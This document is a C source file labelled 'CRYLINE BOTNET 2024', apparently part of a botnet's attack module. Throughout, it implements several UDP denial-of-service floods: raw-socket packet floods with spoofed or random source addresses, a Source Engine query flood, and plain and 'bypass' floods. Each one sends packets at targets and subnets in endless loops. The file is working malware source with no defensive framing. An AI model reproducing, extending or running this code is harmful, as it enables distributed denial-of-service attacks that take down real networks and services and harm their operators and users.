/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/ip.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <sys/socket.h>

#include "LIBRARIES.h"
#include "CHECK_SUM.h"
#include "VALUES_DATASET.h"
#include "RANDOM_GENERATOR.h"
#include "CUSTOM_FUNCTIONS.h"
#include "ATTACKS_CONTROLLER.h"

void __UDP_GENERIC_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int I_COUNTER, GET_LOCAL_DESCRIPTOR;

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    uint8_t GET_IP_TOS = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 2, 0);
    uint16_t GET_IP_IDENT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 3, 0xFFFF);
    uint8_t GET_IP_TTL = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 4, 64);

    __GET_BOOL GET_FRAG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 5, 0);

    __PORT_OPTION _GET_SOURCE_PORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 6, 0xFFFF);
    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);

    uint16_t DATA_LENGHT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 0, 512);

    __GET_BOOL DATA_RANDOM = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 1, 1);

    uint32_t SOURCE_IP = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 25, LOCAL_ADDRESS_SETTER);

    if (DATA_LENGHT > 1460)
    {
        DATA_LENGHT = 1460;
    }

    if ((GET_LOCAL_DESCRIPTOR = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }

    I_COUNTER = 1;

    if (setsockopt(GET_LOCAL_DESCRIPTOR, IPPROTO_IP, IP_HDRINCL, &I_COUNTER, sizeof(int)) == -1)
    {
        close(GET_LOCAL_DESCRIPTOR);
        
        return;
    }

    for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
    {
        struct iphdr *IP_HEADERS;
        struct udphdr *UDP_HEADERS;

        GET_PACKET[I_COUNTER] = calloc(1510, sizeof(char));

        IP_HEADERS = (struct iphdr *)GET_PACKET[I_COUNTER];
        UDP_HEADERS = (struct udphdr *)(IP_HEADERS + 1);

        IP_HEADERS->version = 4;
        IP_HEADERS->ihl = 5;
        IP_HEADERS->tos = GET_IP_TOS;
        IP_HEADERS->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + DATA_LENGHT);
        IP_HEADERS->id = htons(GET_IP_IDENT);
        IP_HEADERS->ttl = GET_IP_TTL;

        if (GET_FRAG)
        {
            IP_HEADERS->frag_off = htons(1 << 14);
        }

        IP_HEADERS->protocol = IPPROTO_UDP;
        IP_HEADERS->saddr = SOURCE_IP;
        IP_HEADERS->daddr = _TARGETS[I_COUNTER]._ADDRESS;

        UDP_HEADERS->source = htons(_GET_SOURCE_PORT);
        UDP_HEADERS->dest = htons(_GET_RPORT);
        UDP_HEADERS->len = htons(sizeof(struct udphdr) + DATA_LENGHT);
    }

    while (1)
    {
        for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
        {
            char *PACKET = GET_PACKET[I_COUNTER];

            struct iphdr *IP_HEADERS = (struct iphdr *)PACKET;
            struct udphdr *UDP_HEADERS = (struct udphdr *)(IP_HEADERS + 1);

            char *DATA = (char *)(UDP_HEADERS + 1);

            if (_TARGETS[I_COUNTER]._NETMASK < 32)
            {
                IP_HEADERS->daddr = htonl(ntohl(_TARGETS[I_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[I_COUNTER]._NETMASK));
            }

            if (SOURCE_IP == 0xffffffff)
            {
                IP_HEADERS->saddr = __RANDOM_NEXT();
            }

            if (GET_IP_IDENT == 0xFFFF)
            {
                IP_HEADERS->id = (uint16_t)__RANDOM_NEXT();
            }
            if (_GET_SOURCE_PORT == 0xFFFF)
            {
                UDP_HEADERS->source = __RANDOM_NEXT();
            }
            if (_GET_RPORT == 0xFFFF)
            {
                UDP_HEADERS->dest = __RANDOM_NEXT();
            }

            if (DATA_RANDOM)
            {
                __RANDOM_STRING(DATA, DATA_LENGHT);
            }

            IP_HEADERS->check = 0;
            IP_HEADERS->check = __CHECK_SUM_GENERIC((uint16_t *)IP_HEADERS, sizeof(struct iphdr));

            UDP_HEADERS->check = 0;
            UDP_HEADERS->check = __CHECK_SUM_TCP_AND_UDP(IP_HEADERS, UDP_HEADERS, UDP_HEADERS->len, sizeof(struct udphdr) + DATA_LENGHT);

            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_port = UDP_HEADERS->dest;

            sendto(GET_LOCAL_DESCRIPTOR, PACKET, sizeof(struct iphdr) + sizeof(struct udphdr) + DATA_LENGHT, MSG_NOSIGNAL, (struct sockaddr *)&_TARGETS[I_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
        }
    }
}

void __UDP_VSE_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int I_COUNTER, GET_LOCAL_DESCRIPTOR;

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    uint8_t GET_IP_TOS = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 2, 0);
    uint16_t GET_IP_IDENT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 3, 0xFFFF);
    uint8_t GET_IP_TTL = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 4, 64);

    __GET_BOOL GET_FRAG = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 5, 0);
    __PORT_OPTION _GET_SOURCE_PORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 6, 0xFFFF);
    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 27015);
    
    char *GET_VSE_PAYLOAD;

    int GET_VSE_PAYLOAD_LENGHT;

    GET_VSE_PAYLOAD = __TABLE_RETRIEVED_VALUE(3, &GET_VSE_PAYLOAD_LENGHT);

    if ((GET_LOCAL_DESCRIPTOR = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }

    I_COUNTER = 1;

    if (setsockopt(GET_LOCAL_DESCRIPTOR, IPPROTO_IP, IP_HDRINCL, &I_COUNTER, sizeof(int)) == -1)
    {
        close(GET_LOCAL_DESCRIPTOR);

        return;
    }

    for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
    {
        struct iphdr *IP_HEADERS;
        struct udphdr *UDP_HEADERS;
        char *DATA;

        GET_PACKET[I_COUNTER] = calloc(128, sizeof(char));
        IP_HEADERS = (struct iphdr *)GET_PACKET[I_COUNTER];
        UDP_HEADERS = (struct udphdr *)(IP_HEADERS + 1);
        DATA = (char *)(UDP_HEADERS + 1);

        IP_HEADERS->version = 4;
        IP_HEADERS->ihl = 5;
        IP_HEADERS->tos = GET_IP_TOS;
        IP_HEADERS->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + GET_VSE_PAYLOAD_LENGHT);
        IP_HEADERS->id = htons(GET_IP_IDENT);
        IP_HEADERS->ttl = GET_IP_TTL;

        if (GET_FRAG)
        {
            IP_HEADERS->frag_off = htons(1 << 14);
        }

        IP_HEADERS->protocol = IPPROTO_UDP;
        IP_HEADERS->saddr = LOCAL_ADDRESS_SETTER;
        IP_HEADERS->daddr = _TARGETS[I_COUNTER]._ADDRESS;

        UDP_HEADERS->source = htons(_GET_SOURCE_PORT);
        UDP_HEADERS->dest = htons(_GET_RPORT);
        UDP_HEADERS->len = htons(sizeof(struct udphdr) + 4 + GET_VSE_PAYLOAD_LENGHT);

        *((uint32_t *)DATA) = 0xFFFFFFFF;

        DATA += sizeof(uint32_t);

        __MEMCPY(DATA, GET_VSE_PAYLOAD, GET_VSE_PAYLOAD_LENGHT);
    }

    while (1)
    {
        for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
        {
            char *PACKET = GET_PACKET[I_COUNTER];
            struct iphdr *IP_HEADERS = (struct iphdr *)PACKET;
            struct udphdr *UDP_HEADERS = (struct udphdr *)(IP_HEADERS + 1);
            
            if (_TARGETS[I_COUNTER]._NETMASK < 32)
            {
                IP_HEADERS->daddr = htonl(ntohl(_TARGETS[I_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[I_COUNTER]._NETMASK));
            }

            if (GET_IP_IDENT == 0xFFFF)
            {
                IP_HEADERS->id = (uint16_t)__RANDOM_NEXT();
            }

            if (_GET_SOURCE_PORT == 0xFFFF)
            {
                UDP_HEADERS->source = __RANDOM_NEXT();
            }

            if (_GET_RPORT == 0xFFFF)
            {
                UDP_HEADERS->dest = __RANDOM_NEXT();
            }

            IP_HEADERS->check = 0;
            IP_HEADERS->check = __CHECK_SUM_GENERIC((uint16_t *)IP_HEADERS, sizeof(struct iphdr));

            UDP_HEADERS->check = 0;
            UDP_HEADERS->check = __CHECK_SUM_TCP_AND_UDP(IP_HEADERS, UDP_HEADERS, UDP_HEADERS->len, sizeof(struct udphdr) + sizeof(uint32_t) + GET_VSE_PAYLOAD_LENGHT);

            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_port = UDP_HEADERS->dest;
            sendto(GET_LOCAL_DESCRIPTOR, PACKET, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + GET_VSE_PAYLOAD_LENGHT, MSG_NOSIGNAL, (struct sockaddr *)&_TARGETS[I_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
        }
    }
}

void __UDP_PLAIN_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int I_COUNTER;

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    int *GET_LOCAL_UDP_DESCRIPTOR = calloc(_TARGETS_LENGHT, sizeof(int));

    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);
    __PORT_OPTION _GET_SOURCE_PORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 6, 0xFFFF);

    uint16_t DATA_LENGHT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 0, 512);

    __GET_BOOL DATA_RANDOM = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 1, 1);

    struct sockaddr_in BIND_ADDRESS = {0};

    if (_GET_SOURCE_PORT == 0xFFFF)
    {
        _GET_SOURCE_PORT = __RANDOM_NEXT();
    } 
    else 
    {
        _GET_SOURCE_PORT = htons(_GET_SOURCE_PORT);
    }

    for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
    {
        struct iphdr *IP_HEADERS;
        struct udphdr *UDP_HEADERS;

        char *DATA;

        GET_PACKET[I_COUNTER] = calloc(65535, sizeof(char));

        if (_GET_RPORT == 0xFFFF)
        {
            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_port = __RANDOM_NEXT();
        }
        else
        {
            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_port = htons(_GET_RPORT);
        }

        if ((GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        BIND_ADDRESS.sin_family = AF_INET;
        BIND_ADDRESS.sin_port = _GET_SOURCE_PORT;
        BIND_ADDRESS.sin_addr.s_addr = 0;

        bind(GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER], (struct sockaddr *)&BIND_ADDRESS, sizeof(struct sockaddr_in));

        if (_TARGETS[I_COUNTER]._NETMASK < 32)
        {
            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_addr.s_addr = htonl(ntohl(_TARGETS[I_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[I_COUNTER]._NETMASK));
        }

        connect(GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER], (struct sockaddr *)&_TARGETS[I_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
    }


    while (1)
    {
        for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
        {
            char *DATA = GET_PACKET[I_COUNTER];

            if (DATA_RANDOM)
            {
                __RANDOM_STRING(DATA, DATA_LENGHT);
            }

            send(GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER], DATA, DATA_LENGHT, MSG_NOSIGNAL);
        }
    }
}

void __UDP_BYPASS_ATTACK(uint8_t _TARGETS_LENGHT, struct __TARGET *_TARGETS, uint8_t _OPTS_LENGHTS, struct __OPTION *_OPT_ARGS)
{
    int I_COUNTER;

    char **GET_PACKET = calloc(_TARGETS_LENGHT, sizeof(char *));

    int *GET_LOCAL_UDP_DESCRIPTOR = calloc(_TARGETS_LENGHT, sizeof(int));

    __PORT_OPTION _GET_RPORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 7, 0xFFFF);
    __PORT_OPTION _GET_SOURCE_PORT = __GET_OPT_INT(_OPTS_LENGHTS, _OPT_ARGS, 6, 0xFFFF);

    struct sockaddr_in BIND_ADDRESS = {0};

    if (_GET_SOURCE_PORT == 0xFFFF)
    {
        _GET_SOURCE_PORT = __RANDOM_NEXT();
    } 
    else 
    {
        _GET_SOURCE_PORT = htons(_GET_SOURCE_PORT);
    }

    for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
    {
        struct iphdr *IP_HEADERS;
        struct udphdr *UDP_HEADERS;

        char *DATA;

        GET_PACKET[I_COUNTER] = calloc(65535, sizeof(char));

        if (_GET_RPORT == 0xFFFF)
        {
            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_port = __RANDOM_NEXT();
        }
        else
        {
            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_port = htons(_GET_RPORT);
        }

        if ((GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        BIND_ADDRESS.sin_family = AF_INET;
        BIND_ADDRESS.sin_port = _GET_SOURCE_PORT;
        BIND_ADDRESS.sin_addr.s_addr = 0;

        bind(GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER], (struct sockaddr *)&BIND_ADDRESS, sizeof(struct sockaddr_in));

        if (_TARGETS[I_COUNTER]._NETMASK < 32)
        {
            _TARGETS[I_COUNTER]._SOCK_ADDRESS.sin_addr.s_addr = htonl(ntohl(_TARGETS[I_COUNTER]._ADDRESS) + (((uint32_t)__RANDOM_NEXT()) >> _TARGETS[I_COUNTER]._NETMASK));
        }

        connect(GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER], (struct sockaddr *)&_TARGETS[I_COUNTER]._SOCK_ADDRESS, sizeof(struct sockaddr_in));
    }

    while (1)
    {
        for (I_COUNTER = 0; I_COUNTER < _TARGETS_LENGHT; I_COUNTER++)
        {
            char *DATA = GET_PACKET[I_COUNTER];

            uint16_t DATA_LENGHT = __RANDOM_NEXT_RANGE(700, 1000);
            
            __RANDOM_STRING(DATA, DATA_LENGHT);

            send(GET_LOCAL_UDP_DESCRIPTOR[I_COUNTER], DATA, DATA_LENGHT, MSG_NOSIGNAL);
        }
    }
}
